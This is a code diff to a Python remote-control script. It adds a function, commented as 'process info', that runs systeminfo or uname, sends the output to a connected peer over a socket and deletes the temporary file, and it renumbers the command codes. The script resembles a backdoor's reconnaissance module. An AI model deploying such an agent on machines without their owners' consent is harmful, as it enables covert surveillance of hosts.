@@ -94,6 +94,31 @@ def GetMoreinfo(sock,target):
     sock.send(b'End')
     os.system('rm -f info.txt')
 
+# 进程信息
+def Process(sock):
+    if SYS == 'nt':
+        os.system('echo nt@ > C:\\ProgramData\\info.txt')
+        os.system('systeminfo >> C:\\ProgramData\\info.txt')
+        f = open('C:\\ProgramData\\info.txt','r')
+        data = f.read()
+        f.close()
+        data = data.encode('utf-8')
+        sock.send(data)
+        sock.send(b'End')
+        os.system('del /f /q C:\\ProgramData\\info.txt')
+        return
+    else:
+        os.system('echo posix@ > info.txt')
+        os.system('uname -a >> info.txt')
+        f = open('info.txt','r')
+        data = f.read()
+        f.close()
+        data = data.encode('utf-8')
+        sock.send(data)
+        sock.send(b'End')
+        os.system('rm -f info.txt')
+        return
+
 # 主程序
 if ACTIVE == 0:
     s = Passive()
@@ -108,11 +133,13 @@ while True:
         break
     elif d == b'1':
         Getinfo(s)
-    elif d == b'0x01':
+    elif d == b'1x01':
         GetMoreinfo(s,'CPU')
-    elif d == b'0x02':
+    elif d == b'1x02':
         GetMoreinfo(s,'MEM')
-    elif d == b'0x03':
+    elif d == b'1x03':
         GetMoreinfo(s,'USB')
+    elif d == b'2':
+        Process(s)
 print('bye')
 s.close()
